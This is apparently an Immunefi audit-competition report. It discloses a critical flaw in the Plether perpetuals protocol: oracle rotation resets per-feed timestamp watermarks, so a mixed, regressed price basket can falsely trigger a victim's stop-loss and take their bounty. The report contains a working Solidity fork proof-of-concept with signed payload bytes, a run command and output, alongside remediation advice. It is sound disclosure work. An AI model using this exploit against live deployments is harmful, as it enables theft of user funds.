# \#98014 [SC-Critical] Oracle rotation resets accepted per-feed watermarks

**Submitted on Nov 4th 2026 at 11:41:16 UTC by @TaiChi_Audit_Group for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98014
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

`PletherOracle` stores accepted per-feed timestamps inside each oracle instance. Timelocked rotation copies the active oracle's six policy fields into a fresh candidate but transfers none of its accepted component watermarks. The first caller after rotation can therefore combine a previously superseded signed component with a newer component, pass the Engine's aggregate timestamp check, and consume the regressed basket atomically.

## Description

Every accepted live basket normally enforces two layers of ordering:

1. each component must be at least as new as that feed's previously accepted timestamp; and
2. the basket's newest component timestamp must not precede the Engine mark.

The per-feed protection is conditional on the oracle-local `hasAcceptedBasket` flag ([src/PletherOracle.sol:762-800](src/PletherOracle.sol:762-800)):

```solidity
if (hasAcceptedBasket && feedTime < _acceptedPrices[i].publishTime) {
    revert PletherOracle__FeedTimeOutOfOrder(
        pythFeedIds[i], feedTime, _acceptedPrices[i].publishTime
    );
}
```

Oracle rotation preserves policy only. `applyOracleConfig()` reads the six mutable policy fields from the active oracle, applies them to the candidate, verifies the result, and returns. It does not read or initialize `hasAcceptedBasket`, `_acceptedPrices`, or `_acceptedBasket` ([src/router/OrderLiquidationBatchLogic.sol:514-529](src/router/OrderLiquidationBatchLogic.sol:514-529)). The Router then installs the fresh candidate.

The candidate cannot be initialized through the supported Router path before activation: all Router price actions still call the currently configured oracle, while the candidate itself accepts price updates only from the Engine's Router. Consequently, a fresh rotation necessarily exposes an uninitialized first-update boundary unless governance can atomically bundle finalization with a valid bootstrap action.

On that first update, the per-feed check is skipped. The only cross-instance continuity check is in `_snapshotFromBasket()`, which compares the basket's **newest** component timestamp with `engine.lastMarkTime()` ([src/PletherOracle.sol:883-902](src/PletherOracle.sol:883-902)). One component newer than the old Engine mark can therefore mask another component that regresses behind the timestamp previously accepted for that feed.

The fork PoC uses authentic signed Pyth messages at these timestamps:

```text
Old accepted timestamp for every feed: 1790091390
Regressed timestamps for feeds 1-5:     1790091384
New timestamp for feed 0:               1790091391
```

All six observations are inside the 15-second live lookback and liquidation/mark-refresh divergence allowance at the fixture block. Before rotation, the mixed payload reverts because `1790091384 < 1790091390`. After rotation, the fresh candidate accepts the same signed observations because it has no accepted state; the aggregate timestamp is `1790091391`, which advances the Engine mark.

The authentic coherent basket at timestamp `1790091391` has mark `0.97668761`. The regressed mixed basket has mark `0.97668281`. A SHORT trader has legitimately placed a stop-loss at `0.97668500`, between those values. The coherent basket does not trigger it. The post-rotation mixed basket does.

`triggerPositionProtection()` processes the price and protection activation atomically. Once met, it consumes the victim's reserved trigger bounty, creates a binding full-position close order, and credits the caller through `engine.creditBounty()` ([src/router/OrderLiquidationBatchLogic.sol:585-619](src/router/OrderLiquidationBatchLogic.sol:585-619)). The victim cannot cancel or replace a triggered protection. A later honest oracle update cannot undo the bounty transfer or remove the queued close attempt.

## Impact Severity

**Critical**

The PoC proves an immediate attacker-controlled transfer from the victim's reserved settlement balance. The victim voluntarily reserved that value only for a valid protection trigger; the attacker obtains it by bypassing the accepted per-feed ordering invariant during rotation. This directly matches the listed Critical impact, **Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield**. The same transaction also forces the victim into a binding full-position close lifecycle at a mark the pre-rotation oracle rejected.

## Why This Is Valid and Not a Known Issue

This report proves that the pinned MED-7 mitigation is incomplete. MED-7's published resolution says complete signed baskets are now required and “accepted component timestamps cannot move backward,” while acknowledging only that a caller may choose an older valid component that has not already been superseded on-chain. The rotation path erases the implemented per-feed watermark and permits an observation older than the timestamp already accepted for that exact feed. The PoC submits identical guardian-signed data on both sides of rotation: the fixed active oracle rejects it with `PletherOracle__FeedTimeOutOfOrder`, while the fresh candidate accepts it and transfers the victim's bounty. This is the competition's express incomplete-fix exception, not the acknowledged residual selection behavior. MED-13 is also distinct: it concerns governance rotation changing which oracle evaluates an armed protection, whereas this root is loss of accepted per-feed ordering state across otherwise legitimate rotation.

## Remediation

Preserve an oracle-independent component-time floor across rotation.

For every candidate first basket, require each component timestamp to be at least `engine.lastMarkTime()` before accepting it. This provides safe continuity even when the candidate changes feed identifiers and is stricter than comparing only the basket's maximum timestamp.

When feed identifiers are retained, additionally copy the old oracle's accepted timestamps into the candidate through a Router-only one-time initialization method. The strongest design is to bootstrap the candidate with a complete validated basket and install its resulting mark atomically during finalization, leaving no public uninitialized interval.

## Proof of Concept

This fork PoC uses:

- the real Arbitrum Sepolia Pyth deployment at `0x0B73614636C855Bf23F342F307FB981A3e47f42B`;
- authentic guardian-signed six-feed accumulator messages already committed in the repository;
- the exact release feed IDs, weights, base prices, and inversion flags;
- production `PletherOracle`, `OrderRouter`, protection, Engine, clearinghouse, and HousePool implementations; and
- a production V3 order and the real protection-trigger path.

No oracle or in-scope contract is mocked, no in-scope storage is written through cheatcodes, and no fabricated price is supplied. The repository's standard six-decimal USDG test collateral is used only to fund the local trader and is expressly permitted by the competition rules.

The PoC derives a one-feed accumulator subset without changing its signed price message, Merkle proof, or guardian-signed root. The real Pyth contract verifies the resulting payload on the fork.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../packages/perps/test/perps/BasePerpTest.sol";
import {LegacyOrderRouterHarness} from "../../packages/perps/test/utils/LegacyOrderRouterHarness.sol";
import {ArbitrumSepoliaReleaseOracle} from "../../script/DeployPerpsArbitrumSepolia.s.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionBook} from "@plether/perps/interfaces/IPositionProtectionBook.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPyth} from "@plether/shared/interfaces/IPyth.sol";
import {ArbitrumForkSupport} from "@plether/test-utils/ArbitrumForkSupport.sol";

contract OracleRotationRealPythForkPoC is BasePerpTest {
    string internal fixture;
    string internal uneven;
    address internal realPyth;
    bytes32[] internal ids;
    ArbitrumSepoliaReleaseOracle internal oldOracle;
    ArbitrumSepoliaReleaseOracle internal candidate;
    address internal constant TRADER = address(0xA11CE);
    address internal constant ATTACKER = address(0xBAD);
    uint256 internal constant POSITION_SIZE = 100_000e18;
    uint256 internal constant STOP_LOSS = 97_668_500;

    function setUp() public override {
        fixture = vm.readFile("test/fixtures/oracle-sync/live-watermark-sep22.json");
        uneven = vm.readFile("test/fixtures/oracle-sync/live-watermark-uneven.json");
        uint256 forkNumber = vm.parseJsonUint(fixture, ".forkBlockNumber");
        vm.createSelectFork(vm.envString("ARB_SEPOLIA_RPC_URL"), forkNumber);
        ArbitrumForkSupport.install();
        realPyth = vm.parseJsonAddress(fixture, ".pyth");
        ids = vm.parseJsonBytes32Array(fixture, ".feedIds");

        vm.warp(SETUP_TIMESTAMP);
        super.setUp();
        oldOracle = _newReleaseOracle();
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(oldOracle)));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        pletherOracle = oldOracle;

        candidate = _newReleaseOracle();
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(candidate)));
        vm.deal(address(this), 10 ether);
    }

    function test_RealSignedRotationAcceptsPreviouslyRejectedRegression() public {
        uint256 initialTime = vm.parseJsonUintArray(fixture, ".updates.initial.publishTimes")[0];
        uint256 nextTime = vm.parseJsonUintArray(fixture, ".updates.next.publishTimes")[0];
        uint256 skippedTime = vm.parseJsonUintArray(fixture, ".updates.skipped.publishTimes")[0];
        uint256 laggingTime = vm.parseJsonUintArray(uneven, ".updates.lagging.publishTimes")[0];
        uint256 forkTime = vm.parseJsonUint(fixture, ".forkTimestamp");
        bytes[] memory next = _fullData("next");
        bytes[] memory honest = _fullData("skipped");
        bytes[] memory mixed = _mixedAttackData();

        _fundTrader(TRADER, 10_000e6);
        _openSignedShort(initialTime);
        vm.warp(forkTime);
        router.updateMarkPrice{value: oldOracle.getUpdateFee(next)}(next);
        assertEq(engine.lastMarkTime(), nextTime);
        uint256 nextMark = engine.lastMarkPrice();
        uint256[] memory oldTimes = oldOracle.getAcceptedFeedPublishTimes();
        for (uint256 i; i < ids.length; ++i) assertEq(oldTimes[i], nextTime);
        assertTrue(oldOracle.hasAcceptedBasket());

        IPositionProtectionActions protectionActions =
            IPositionProtectionActions(address(router.positionProtectionBook()));
        PositionProtectionTypes.CloseFinancialLimits memory limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.prank(TRADER);
        uint64 protectionId = protectionActions.createPositionProtection(
            PositionProtectionTypes.PositionProtectionParams({
                takeProfitTriggerPrice: 0, stopLossTriggerPrice: STOP_LOSS, closeLimits: limits
            })
        );
        vm.roll(vm.getBlockNumber() + 1);

        uint256 honestFee = oldOracle.getUpdateFee(honest);
        vm.prank(ATTACKER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__TriggerNotMet.selector);
        protectionActions.triggerPositionProtection{value: honestFee}(protectionId, honest);

        uint256 mixedFee = oldOracle.getUpdateFee(mixed);
        vm.expectRevert(
            abi.encodeWithSelector(
                IPletherOracle.PletherOracle__FeedTimeOutOfOrder.selector, ids[1], laggingTime, nextTime
            )
        );
        router.updateMarkPrice{value: mixedFee}(mixed);

        // Read both authentic signed baskets on fresh, uninitialized candidates.
        ArbitrumSepoliaReleaseOracle honestOracle = _newReleaseOracle();
        vm.prank(address(router));
        IPletherOracle.PriceSnapshot memory honestSnapshot = honestOracle.updatePrice(
            address(this), honest, IPletherOracle.PriceMode.Liquidation
        );

        routerAdmin.finalizeOracleConfig();
        assertFalse(candidate.hasAcceptedBasket());
        uint256 attackerBefore = clearinghouse.balanceAssets(ATTACKER);
        uint256 attackFee = candidate.getUpdateFee(mixed);
        vm.prank(ATTACKER);
        uint64 linkedOrderId =
            protectionActions.triggerPositionProtection{value: attackFee}(protectionId, mixed);

        (bool accepted, uint256 mixedMark, uint64 mixedTime) = candidate.getAcceptedBasketMark();
        assertTrue(accepted);
        assertEq(mixedTime, skippedTime);
        uint256[] memory acceptedTimes = candidate.getAcceptedFeedPublishTimes();
        assertEq(acceptedTimes[0], skippedTime);
        for (uint256 i = 1; i < ids.length; ++i) assertEq(acceptedTimes[i], laggingTime);
        PositionProtectionTypes.PositionProtectionView memory protection =
            IPositionProtectionBook(address(router.positionProtectionBook())).getPositionProtection(protectionId);
        assertEq(uint8(protection.status), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
        assertEq(protection.linkedOrderId, linkedOrderId);
        assertEq(protection.triggerMarkPrice, mixedMark);
        assertEq(router.pendingOrderCounts(TRADER), 1);
        uint256 stolenBounty = clearinghouse.balanceAssets(ATTACKER) - attackerBefore;
        assertEq(stolenBounty, router.positionProtectionTriggerBountyAssets());

        emit log_named_uint("honest signed mark", honestSnapshot.markPrice);
        emit log_named_uint("mixed regressed signed mark", mixedMark);
        emit log_named_uint("old accepted signed mark", nextMark);
        emit log_named_uint("old component watermark", nextTime);
        emit log_named_uint("accepted regressed component time", laggingTime);
        emit log_named_uint("newest component time", mixedTime);
        emit log_named_uint("attacker trigger bounty", stolenBounty);
    }

    function _openSignedShort(uint256 publishTime) internal {
        vm.warp(publishTime - 1);
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256("rotation-watermark-short"),
            side: CfdTypes.Side.SHORT,
            sizeDelta: POSITION_SIZE,
            marginDelta: 5000e6,
            targetPrice: CAP_PRICE,
            isClose: false,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: POSITION_SIZE,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(TRADER);
        uint64 orderId = OrderRouter(payable(address(router))).commitOrder(request);
        vm.warp(publishTime);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory initial = _fullData("initial");
        vm.prank(ATTACKER);
        OrderV3Types.ExecutionResult memory result =
            router.executeOrder{value: oldOracle.getOrderExecutionFee(initial)}(orderId, initial);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _newReleaseOracle() internal returns (ArbitrumSepoliaReleaseOracle) {
        return new ArbitrumSepoliaReleaseOracle(
            address(engine),
            address(pool),
            realPyth,
            ids,
            vm.parseJsonUintArray(fixture, ".quantities"),
            vm.parseJsonUintArray(fixture, ".basePrices"),
            abi.decode(vm.parseJson(fixture, ".inversions"), (bool[]))
        );
    }

    function _fullData(string memory name) internal view returns (bytes[] memory) {
        return abi.decode(vm.parseJson(fixture, string.concat(".updates.", name, ".updateData")), (bytes[]));
    }

    function _mixedAttackData() internal view returns (bytes[] memory data) {
        bytes[] memory lagging =
            abi.decode(vm.parseJson(uneven, ".updates.lagging.updateData"), (bytes[]));
        data = new bytes[](2);
        data[0] = hex"504e4155010000000124010000000103014fe16042e005043c99835905e1a9869b58ff76c4866bffc352235f98d84c38d62e59467a8fe5d06dc7efd823c794fe22dbf388f404218de7a32f2493d5d9e7b00002dff426ffafbbc2a3ec9106c47836c5f9074eceea331ec2d81ae388c1318cc3043344541ac0b91bfca32a362909caa5df4d365f0d7bddf6a60912462bb4b1108e0004ce38b24b43381e0db3d29efc4574b267896e87d6bdff2a2792194cc7d3935706545438eaf454ef2bd720f8716650577dafd5b6558f1c1899ccbe6a2bdbf190b0016ab2a07f00000000001a507974686e6574507974686e6574507974686e6574507974686e6574507974680000000855f489ec0041555756000000000855f489ec00000000704a3efd6937e1b8da34725ef012974584ff2e5001005500a995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b000000000001beb70000000000000003fffffffb000000006ab2a07f000000006ab2a07e000000000001bf1600000000000000030c1a7a74faff63ca6ae4c565c6ace0322c170ab1845893dd74d8a0ca8edd31b56ac947dd94b0238d6266bc2e0ed012a39f2058c2ac006ea7805e17f5a7e061d9f62ccaf02d36afa5756b97d9c1136cb486ee85b5dc516263883120de1bdd54894be053bf86b2d5c2ae5cc9ad47213be194101df32fac8d9bf7564c096b93e693cd8f43ab3482f3b96290381fdf479cddc5f7f87bb4b9ed415bba5f9fab81a7438c0ad2ba993f840ec01dc53bf100cddd63f43bf03b579f639cf0ade856fb47ba55c9145b0d6f8caad8a5d1f2435a53a21f4f2aa68bcab3fb28f018cff21bba1c97b8de7d02f44eee519fcea899a3f6abe1";
        data[1] = lagging[0];
    }


    function _deployLegacyOrderRouter(
        address engine_,
        address engineLens_,
        address pool_,
        address oracle_
    ) internal override returns (LegacyOrderRouterHarness deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook book = new OrderLifecycleBook(predictedRouter, engine_, address(clearinghouse), pool_);
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        OrderRouter productionRouter = new OrderRouter(
            engine_, engineLens_, pool_, oracle_, address(keeperSidecar), address(policyEvaluator),
            address(orderExecutionSidecar), address(book)
        );
        assertEq(address(productionRouter), predictedRouter);
        return LegacyOrderRouterHarness(payable(address(productionRouter)));
    }
}
```

### Run Command

Save the Solidity block as `test/poc/TCOracleRotationWatermarkFork.t.sol` at the repository root. Run with Foundry 1.5.1 and an Arbitrum Sepolia archive RPC:

```bash
ARB_SEPOLIA_RPC_URL=<archive-rpc> forge test \
  --offline --isolate \
  --match-path test/poc/TCOracleRotationWatermarkFork.t.sol -vv
```

The verification run used the public archive endpoint `https://api.zan.top/arb-sepolia`.

### Verified Output

```text
[PASS] test_RealSignedRotationAcceptsPreviouslyRejectedRegression() (gas: 18292712)
Logs:
  honest signed mark: 97668761
  mixed regressed signed mark: 97668281
  old accepted signed mark: 97668781
  old component watermark: 1790091390
  accepted regressed component time: 1790091384
  newest component time: 1790091391
  attacker trigger bounty: 200000

Suite result: ok. 1 passed; 0 failed; 0 skipped
```
